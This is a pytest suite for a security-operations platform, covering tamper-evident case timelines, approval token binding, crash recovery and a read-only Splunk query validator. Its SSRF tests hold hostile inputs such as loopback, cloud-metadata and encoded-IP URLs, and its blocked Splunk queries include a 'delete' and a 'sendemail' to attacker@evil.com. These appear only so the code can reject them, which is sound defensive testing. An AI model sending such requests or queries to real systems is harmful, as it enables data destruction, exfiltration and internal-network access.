"""Phase 8.1 Security & Reliability Hardening Verification Suite.

Tests:
1. Case Integrity Hardening (A1):
   - Valid chain -> INTACT
   - Modified event description -> TAMPERED
   - Modified actor -> TAMPERED
   - Modified timestamp -> TAMPERED
   - Modified event data -> TAMPERED
   - Missing event -> TAMPERED / INCOMPLETE
   - Reordered events -> TAMPERED
   - Broken previous hash -> TAMPERED
   - Legacy case without chain -> LEGACY_UNVERIFIABLE (never TAMPERED)
   - Concurrent event creation -> consistent chain without race conditions
   - Audit export verification with algorithm and root hash
   - Database failure handling -> ERROR
   - Signed checkpoint support / UNSIGNED_CHECKPOINT

2. Provider Health vs Enabled (A2):
   - Enabled True with missing config -> configured=False, status=NOT_CONFIGURED, authenticated=False
   - Disabled provider -> status=DISABLED
   - Capabilities available only when enabled and authenticated

3. Connection-Time SSRF Protection (A3):
   - IPv4 / IPv6 loopback
   - Cloud metadata (169.254.169.254)
   - IPv4-mapped IPv6
   - Numeric IP formats
   - Redirect to private address blocked
   - Peer mismatch detection
   - Secret redaction from URL and errors

4. Approval Capability Multi-Attribute Binding (A4):
   - Provider mismatch rejection
   - Action mismatch rejection
   - Resource mismatch rejection
   - Altered parameter hash rejection
   - Replay prevention and atomic CAS

5. Safe SOAR Recovery & Idempotency (A5):
   - In-flight actions marked OUTCOME_UNKNOWN on restart
   - Destructive actions never automatically replayed
   - Reconciliation restores or closes execution

6. Splunk Conservative SPL Read-Only Parser (A6):
   - Permits read-only commands (stats, table, where, eval)
   - Blocks prohibited commands (delete, outputlookup, collect)
   - Blocks unknown commands by default
   - Blocks comments and semicolon statement chaining
   - Validates subsearches recursively

7. Provider Offline Behavior (A7):
   - Containment operations return NOT_CONFIGURED, never fake success
"""

from __future__ import annotations

import hashlib
import json
import os
import socket
import tempfile
import threading
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from redloop.assessment.case_management import (
    CaseManager,
    CasePriority,
    CaseSeverity,
    CaseStatus,
    IntegrityStatus,
    canonical_json_dumps,
)
from redloop.assessment.soar_actions import (
    ActionExecutionStatus,
    SafeWebhookClient,
    SOARActionRegistry,
    SSRFValidationError,
    redact_sensitive_url,
)
from redloop.assessment.soar_engine import (
    SOAREngine,
    TriggerType,
    WorkflowState,
)
from redloop.assessment.soc_playbooks import PlaybookApprovalStore
from redloop.integrations.adapters.edr_defender import DefenderForEndpointAdapter as DefenderAdapter
from redloop.integrations.adapters.splunk import SplunkAdapter, validate_spl_query
from redloop.integrations.base import ProviderCategory, ProviderStatus


# ==============================================================================
# A1: Case Integrity Hardening Tests
# ==============================================================================

class TestCaseIntegrityHardening:
    @pytest.fixture
    def cm(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = Path(tmpdir) / "test_cases.db"
            manager = CaseManager(db_path=db_path)
            yield manager

    def test_01_valid_chain(self, cm: CaseManager):
        case = cm.create_case(title="Valid Case", description="Initial description")
        cm.update_case(case.case_id, status=CaseStatus.INVESTIGATING, actor="analyst_1")
        cm.add_note(case.case_id, author="analyst_1", content="Note 1")
        res = cm.verify_case_integrity(case.case_id)
        assert res["status"] == IntegrityStatus.INTACT.value
        assert res["is_valid"] is True
        assert res["timeline_events_verified"] == 3
        assert res["broken_index"] is None
        assert res["algorithm"] == "SHA-256-FORWARD-CHAIN-V1"
        assert res["checkpoint_status"] == "UNSIGNED_CHECKPOINT"

    def test_02_modified_event_description(self, cm: CaseManager):
        case = cm.create_case(title="Tamper Desc", description="Desc")
        cm.add_note(case.case_id, author="analyst", content="Original Note")
        
        # Tamper directly in SQLite
        conn = cm._get_connection()
        try:
            with conn:
                cur = conn.execute("SELECT timeline_json FROM cases WHERE case_id = ?", (case.case_id,))
                tl = json.loads(cur.fetchone()[0])
                tl[1]["description"] = "TAMPERED DESCRIPTION"
                conn.execute("UPDATE cases SET timeline_json = ? WHERE case_id = ?", (json.dumps(tl), case.case_id))
        finally:
            conn.close()

        res = cm.verify_case_integrity(case.case_id)
        assert res["status"] == IntegrityStatus.TAMPERED.value
        assert res["is_valid"] is False
        assert res["broken_index"] == 1

    def test_03_modified_actor(self, cm: CaseManager):
        case = cm.create_case(title="Tamper Actor", description="Desc")
        cm.add_note(case.case_id, author="analyst_alice", content="Note")

        conn = cm._get_connection()
        try:
            with conn:
                cur = conn.execute("SELECT timeline_json FROM cases WHERE case_id = ?", (case.case_id,))
                tl = json.loads(cur.fetchone()[0])
                tl[1]["actor"] = "malicious_actor"
                conn.execute("UPDATE cases SET timeline_json = ? WHERE case_id = ?", (json.dumps(tl), case.case_id))
        finally:
            conn.close()

        res = cm.verify_case_integrity(case.case_id)
        assert res["status"] == IntegrityStatus.TAMPERED.value
        assert res["is_valid"] is False
        assert res["broken_index"] == 1

    def test_04_modified_timestamp(self, cm: CaseManager):
        case = cm.create_case(title="Tamper TS", description="Desc")
        cm.add_note(case.case_id, author="analyst", content="Note")

        conn = cm._get_connection()
        try:
            with conn:
                cur = conn.execute("SELECT timeline_json FROM cases WHERE case_id = ?", (case.case_id,))
                tl = json.loads(cur.fetchone()[0])
                tl[1]["timestamp"] = "1970-01-01T00:00:00+00:00"
                conn.execute("UPDATE cases SET timeline_json = ? WHERE case_id = ?", (json.dumps(tl), case.case_id))
        finally:
            conn.close()

        res = cm.verify_case_integrity(case.case_id)
        assert res["status"] == IntegrityStatus.TAMPERED.value
        assert res["is_valid"] is False

    def test_05_modified_event_data(self, cm: CaseManager):
        case = cm.create_case(title="Tamper Data", description="Desc")
        cm.add_note(case.case_id, author="analyst", content="Note")

        conn = cm._get_connection()
        try:
            with conn:
                cur = conn.execute("SELECT timeline_json FROM cases WHERE case_id = ?", (case.case_id,))
                tl = json.loads(cur.fetchone()[0])
                tl[1]["data"]["extra_param"] = "injected_value"
                conn.execute("UPDATE cases SET timeline_json = ? WHERE case_id = ?", (json.dumps(tl), case.case_id))
        finally:
            conn.close()

        res = cm.verify_case_integrity(case.case_id)
        assert res["status"] == IntegrityStatus.TAMPERED.value
        assert res["is_valid"] is False

    def test_06_missing_event(self, cm: CaseManager):
        case = cm.create_case(title="Missing Event", description="Desc")
        cm.add_note(case.case_id, author="analyst", content="Note 1")
        cm.add_note(case.case_id, author="analyst", content="Note 2")

        # Delete middle event
        conn = cm._get_connection()
        try:
            with conn:
                cur = conn.execute("SELECT timeline_json FROM cases WHERE case_id = ?", (case.case_id,))
                tl = json.loads(cur.fetchone()[0])
                del tl[1]  # remove event 1
                conn.execute("UPDATE cases SET timeline_json = ? WHERE case_id = ?", (json.dumps(tl), case.case_id))
        finally:
            conn.close()

        res = cm.verify_case_integrity(case.case_id)
        assert res["status"] == IntegrityStatus.TAMPERED.value
        assert res["is_valid"] is False
        assert res["broken_index"] == 1  # Note 2 now has prev_hash matching deleted Note 1

    def test_07_reordered_event(self, cm: CaseManager):
        case = cm.create_case(title="Reordered", description="Desc")
        cm.add_note(case.case_id, author="analyst", content="Note 1")
        cm.add_note(case.case_id, author="analyst", content="Note 2")

        conn = cm._get_connection()
        try:
            with conn:
                cur = conn.execute("SELECT timeline_json FROM cases WHERE case_id = ?", (case.case_id,))
                tl = json.loads(cur.fetchone()[0])
                # swap event 1 and event 2
                tl[1], tl[2] = tl[2], tl[1]
                conn.execute("UPDATE cases SET timeline_json = ? WHERE case_id = ?", (json.dumps(tl), case.case_id))
        finally:
            conn.close()

        res = cm.verify_case_integrity(case.case_id)
        assert res["status"] == IntegrityStatus.TAMPERED.value
        assert res["is_valid"] is False

    def test_08_broken_previous_hash(self, cm: CaseManager):
        case = cm.create_case(title="Broken Prev", description="Desc")
        cm.add_note(case.case_id, author="analyst", content="Note 1")

        conn = cm._get_connection()
        try:
            with conn:
                cur = conn.execute("SELECT timeline_json FROM cases WHERE case_id = ?", (case.case_id,))
                tl = json.loads(cur.fetchone()[0])
                tl[1]["prev_hash"] = "f" * 64
                conn.execute("UPDATE cases SET timeline_json = ? WHERE case_id = ?", (json.dumps(tl), case.case_id))
        finally:
            conn.close()

        res = cm.verify_case_integrity(case.case_id)
        assert res["status"] == IntegrityStatus.TAMPERED.value
        assert res["is_valid"] is False
        assert res["broken_index"] == 1

    def test_09_legacy_case_without_chain(self, cm: CaseManager):
        # Simulate an older case created pre-Phase 7.1 with integrity_version = 0
        conn = cm._get_connection()
        try:
            with conn:
                legacy_tl = [
                    {
                        "event_id": "legacy-evt-1",
                        "event_type": "CASE_CREATED",
                        "actor": "admin",
                        "description": "Legacy case",
                        "data": {},
                        "timestamp": "2025-01-01T00:00:00+00:00",
                        "prev_hash": "0" * 64,
                        "entry_hash": "",  # Unhashed legacy entry
                    }
                ]
                conn.execute(
                    """
                    INSERT INTO cases
                    (case_id, title, description, status, severity, priority, assigned_to, created_at, updated_at,
                     linked_alert_ids_json, linked_incident_ids_json, evidence_ids_json, related_indicators_json,
                     notes_json, timeline_json, reopen_history_json, integrity_version, root_hash)
                    VALUES ('case-legacy-99', 'Legacy Case', 'Desc', 'OPEN', 'LOW', 'P4', 'unassigned', '2025-01-01', '2025-01-01',
                            '[]', '[]', '[]', '{}', '[]', ?, '[]', 0, '')
                    """,
                    (json.dumps(legacy_tl),),
                )
        finally:
            conn.close()

        res = cm.verify_case_integrity("case-legacy-99")
        # Critical Requirement A1: Never classify a legacy unchained case as TAMPERED
        assert res["status"] == IntegrityStatus.LEGACY_UNVERIFIABLE.value
        assert res["is_valid"] is False
        assert "predates cryptographic hash-chain support" in res["details"]

    def test_10_concurrent_event_creation(self, cm: CaseManager):
        case = cm.create_case(title="Concurrency Test", description="Desc")
        errors = []

        def worker(idx: int):
            try:
                cm.add_note(case.case_id, author=f"worker_{idx}", content=f"Concurrent Note {idx}")
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=worker, args=(i,)) for i in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert len(errors) == 0
        res = cm.verify_case_integrity(case.case_id)
        assert res["status"] == IntegrityStatus.INTACT.value
        assert res["is_valid"] is True
        assert res["timeline_events_verified"] == 11  # 1 genesis + 10 notes

    def test_11_audit_export_verification(self, cm: CaseManager):
        case = cm.create_case(title="Audit Export Case", description="Testing export")
        cm.add_note(case.case_id, author="analyst", content="Verification Note")
        
        report = cm.export_case_audit_report(case.case_id)
        assert report["case_id"] == case.case_id
        assert "integrity_verification" in report
        assert report["integrity_algorithm"] == "SHA-256-FORWARD-CHAIN-V1"
        assert report["integrity_version"] == "1.0"
        assert report["integrity_verification"]["status"] == "INTACT"
        assert "limitations_notice" in report

    def test_12_database_failure_during_verification(self, cm: CaseManager):
        case = cm.create_case(title="DB Failure Case", description="Desc")
        with patch.object(cm, "get_case", side_effect=RuntimeError("Simulated disk error")):
            res = cm.verify_case_integrity(case.case_id)
            assert res["status"] == IntegrityStatus.ERROR.value
            assert res["is_valid"] is False
            assert "Simulated disk error" in res["details"]

    def test_13_signed_checkpoint_support(self, cm: CaseManager):
        case = cm.create_case(title="Signed Checkpoint", description="Desc")
        # With signing key configured
        with patch.dict(os.environ, {"REDLOOP_AUDIT_SIGNING_KEY": "super-secret-signing-key-12345"}):
            res = cm.verify_case_integrity(case.case_id)
            assert res["checkpoint_status"] == "SIGNED_CHECKPOINT"
            assert res["signature"] is not None
            assert len(res["signature"]) == 64


# ==============================================================================
# A2: Provider Health vs Enabled State
# ==============================================================================

class TestProviderHealthVsEnabled:
    def test_enabled_without_config_is_not_connected(self):
        # Defender adapter without credentials
        with patch.dict(os.environ, {}, clear=True):
            prov = DefenderAdapter(enabled=True)
            prov._explicit_tenant_id = None
            prov._explicit_client_id = None
            prov._explicit_client_secret = None

            d = prov.to_dict()
            assert d["enabled"] is True
            assert d["configured"] is False
            assert d["authenticated"] is False
            assert d["connectivity_status"] == ProviderStatus.NOT_CONFIGURED.value
            assert d["capabilities_available"] == []

    def test_disabled_provider_status(self):
        prov = DefenderAdapter(enabled=False)
        d = prov.to_dict()
        assert d["enabled"] is False
        assert d["connectivity_status"] == ProviderStatus.DISABLED.value


# ==============================================================================
# A3: SSRF Protection at Connection Time
# ==============================================================================

class TestSSRFConnectionHardening:
    def test_loopback_and_metadata_blocked(self):
        with pytest.raises(SSRFValidationError):
            SafeWebhookClient.validate_destination("https://127.0.0.1/hook")
        with pytest.raises(SSRFValidationError):
            SafeWebhookClient.validate_destination("https://169.254.169.254/latest/meta-data")
        with pytest.raises(SSRFValidationError):
            SafeWebhookClient.validate_destination("https://[::1]/hook")
        with pytest.raises(SSRFValidationError):
            SafeWebhookClient.validate_destination("https://[::ffff:127.0.0.1]/hook")

    def test_numeric_ip_representations_blocked(self):
        # 2130706433 is 127.0.0.1 in decimal
        with pytest.raises(SSRFValidationError):
            SafeWebhookClient.validate_destination("https://2130706433/webhook")
        # 0x7f000001 is 127.0.0.1 in hex
        with pytest.raises(SSRFValidationError):
            SafeWebhookClient.validate_destination("https://0x7f000001/webhook")

    def test_secret_redaction_in_urls(self):
        url = "https://user:SuperSecretPassword123@api.partner.com/alert?token=SecTokenABC&user=analyst"
        redacted = redact_sensitive_url(url)
        assert "SuperSecretPassword123" not in redacted
        assert "[REDACTED]" in redacted
        assert "SecTokenABC" not in redacted
        assert "******" in redacted
        assert "analyst" in redacted


# ==============================================================================
# A4: Approval Capability Binding Hardening
# ==============================================================================

class TestApprovalBindingHardening:
    @pytest.fixture
    def approval_store(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = Path(tmpdir) / "test_approvals.db"
            store = PlaybookApprovalStore(db_path=db_path)
            yield store

    def test_provider_and_action_mismatch_rejected(self, approval_store: PlaybookApprovalStore):
        cap, token_secret = approval_store.issue_capability(
            playbook_id="PB-TEST",
            step_id="step-iso",
            action_command="isolate_endpoint",
            provider_id="defender",
            action_name="isolate_endpoint",
            resource_id="10.0.0.99",
            action_params={"host_ip": "10.0.0.99"},
        )

        # 1. Attempt to execute for a different provider (crowdstrike)
        ok, msg, _ = approval_store.validate_and_consume(
            playbook_id="PB-TEST",
            step_id="step-iso",
            token_secret=token_secret,
            expected_provider_id="crowdstrike",
        )
        assert ok is False
        assert "provider" in msg.lower()

        # 2. Attempt to execute a different action (disable_account)
        ok2, msg2, _ = approval_store.validate_and_consume(
            playbook_id="PB-TEST",
            step_id="step-iso",
            token_secret=token_secret,
            expected_provider_id="defender",
            expected_action_name="disable_account",
        )
        assert ok2 is False
        assert "action" in msg2.lower()

        # 3. Attempt with altered parameters
        ok3, msg3, _ = approval_store.validate_and_consume(
            playbook_id="PB-TEST",
            step_id="step-iso",
            token_secret=token_secret,
            expected_provider_id="defender",
            expected_action_name="isolate_endpoint",
            expected_action_params={"host_ip": "10.0.0.100"},  # altered IP!
        )
        assert ok3 is False
        assert "parameters" in msg3.lower()

        # 4. Valid execution succeeds
        ok4, msg4, cap_dict = approval_store.validate_and_consume(
            playbook_id="PB-TEST",
            step_id="step-iso",
            token_secret=token_secret,
            expected_provider_id="defender",
            expected_action_name="isolate_endpoint",
            expected_action_params={"host_ip": "10.0.0.99"},
        )
        assert ok4 is True
        assert cap_dict["provider_id"] == "defender"

        # 5. Replay attempt rejected
        ok5, msg5, _ = approval_store.validate_and_consume(
            playbook_id="PB-TEST",
            step_id="step-iso",
            token_secret=token_secret,
        )
        assert ok5 is False
        assert "already consumed" in msg5.lower()


# ==============================================================================
# A5: Safe SOAR Recovery & Idempotency
# ==============================================================================

class TestSOARRecoveryHardening:
    def test_in_progress_action_marked_outcome_unknown_on_restart(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = Path(tmpdir) / "soar_restart.db"
            engine = SOAREngine(db_path=db_path)

            # Insert simulated in-progress action (as if server crashed mid-dispatch)
            conn = engine._get_connection()
            try:
                with conn:
                    conn.execute(
                        """
                        INSERT INTO soar_executions (execution_id, workflow_id, workflow_title, trigger_json, state, current_step_index, total_steps, executed_steps_json, evidence_ids_json, started_at)
                        VALUES ('exec-crash-1', 'WF-TEST', 'Test', '{}', 'RUNNING', 0, 1, '[]', '[]', '2026-11-04T00:00:00+00:00')
                        """
                    )
                    conn.execute(
                        """
                        INSERT INTO soar_action_executions
                        (action_exec_id, execution_id, workflow_id, step_id, action_name, provider_id, resource_id, idempotency_key, state, is_destructive, parameters_json, created_at, updated_at)
                        VALUES ('aexec-1', 'exec-crash-1', 'WF-TEST', 'step-1', 'isolate_endpoint', 'defender', '10.0.0.5', 'idemp-1', 'IN_PROGRESS', 1, '{}', '2026-11-04T00:00:00+00:00', '2026-11-04T00:00:00+00:00')
                        """
                    )
            finally:
                conn.close()

            # Simulate restart
            recovered = engine.recover_interrupted_executions()
            assert recovered >= 1

            # Verify action is OUTCOME_UNKNOWN and not replayed
            conn = engine._get_connection()
            try:
                cur = conn.execute("SELECT state FROM soar_action_executions WHERE action_exec_id = 'aexec-1'")
                assert cur.fetchone()[0] == "OUTCOME_UNKNOWN"

                cur_wf = conn.execute("SELECT state FROM soar_executions WHERE execution_id = 'exec-crash-1'")
                assert cur_wf.fetchone()[0] == "OUTCOME_UNKNOWN"
            finally:
                conn.close()

            # Reconcile action
            reconciled = engine.reconcile_action_execution("aexec-1", verified_outcome="SUCCEEDED", provider_evidence={"confirmed": True})
            assert reconciled is True


# ==============================================================================
# A6: Splunk Conservative SPL Read-Only Parser
# ==============================================================================

class TestSplunkConservativeSPL:
    def test_permitted_spl_queries(self):
        assert validate_spl_query("index=security error | stats count by host")
        assert validate_spl_query("search index=firewall action=blocked | table src_ip, dst_ip, port | head 25")
        assert validate_spl_query("index=main | eval is_threat=1 | where is_threat=1")

    def test_prohibited_spl_commands_blocked(self):
        with pytest.raises(ValueError, match="Prohibited"):
            validate_spl_query("index=main | delete")
        with pytest.raises(ValueError, match="Prohibited"):
            validate_spl_query("index=main | outputlookup bad_file.csv")
        with pytest.raises(ValueError, match="Prohibited"):
            validate_spl_query("index=main | collect index=summary")
        with pytest.raises(ValueError, match="Prohibited"):
            validate_spl_query("index=main | sendemail to=attacker@evil.com")

    def test_unknown_commands_and_comments_blocked(self):
        with pytest.raises(ValueError, match="Comments are prohibited"):
            validate_spl_query("index=main /* comment trick */ | stats count")
        with pytest.raises(ValueError, match="Command chaining"):
            validate_spl_query("index=main; delete")
        with pytest.raises(ValueError, match="Unrecognized or unapproved"):
            validate_spl_query("index=main | custom_exfil_command param=1")

    def test_subsearches_validated(self):
        # Valid subsearch
        assert validate_spl_query("index=main [ search index=intel bad_ip=1.1.1.1 | fields bad_ip ]")
        # Prohibited command inside subsearch
        with pytest.raises(ValueError, match="Prohibited"):
            validate_spl_query("index=main [ search index=intel | delete ]")


# ==============================================================================
# A7: Integration Offline Behavior
# ==============================================================================

class TestIntegrationOfflineBehavior:
    def test_external_containment_never_simulates_success(self):
        # Calling isolate_endpoint on unconfigured external provider must return NOT_CONFIGURED
        res = SOARActionRegistry.isolate_endpoint(
            host_ip="192.168.1.50",
            provider="defender",
            capability_token="valid-token-secret",
            simulate_if_unconfigured=False,
        )
        assert res.status == ActionExecutionStatus.NOT_CONFIGURED
        assert res.status != ActionExecutionStatus.SUCCESS

    def test_external_account_disable_never_simulates_success(self):
        res = SOARActionRegistry.disable_account(
            username="compromised_user",
            provider="entra_id",
            capability_token="valid-token-secret",
            simulate_if_unconfigured=False,
        )
        assert res.status == ActionExecutionStatus.NOT_CONFIGURED
        assert res.status != ActionExecutionStatus.SUCCESS
